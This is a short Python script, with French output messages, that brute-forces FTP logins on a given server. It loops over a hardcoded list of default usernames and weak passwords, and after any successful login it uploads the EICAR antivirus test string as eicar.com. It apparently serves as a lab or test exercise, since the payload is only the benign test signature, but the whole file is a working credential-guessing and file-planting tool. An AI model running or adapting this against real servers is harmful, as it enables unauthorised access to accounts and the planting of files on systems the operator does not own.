#!/usr/bin/python3
from ftplib import FTP
import io,sys,ftplib
 
users = ['admin','sys','demo','insa']
passwords = ['1234','123456','@password']


def createeicar():
	myfile = open("eicar.txt", "w")
	myfile.write("X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\n")

def bruteforce(server):
	for user in users:
		for password in passwords:
			try:
				ftp = FTP(server)      
				ftp.login(user,password)     
				print ("[++] Compte identifie : "+user+" / Mot de passe : "+password)
				createeicar()
				file = open('eicar.txt','rb')  
				ftp.storbinary('STOR eicar.com', file)
				print ("[++] Fichier depose")
			except ftplib.error_perm:
				print ("[-] Erreur de connexion avec le compte : "+user+" / Mot de passe : "+password)

if __name__ == '__main__':
	try:
		server = sys.argv[1]
	except IndexError:
		server = ""
        
	if server=="":
		print (" Syntaxe : "+sys.argv[0]+" IP_du_serveur")
		exit()
	print ("[+] Test sur le serveur : "+server)
	bruteforce(server)
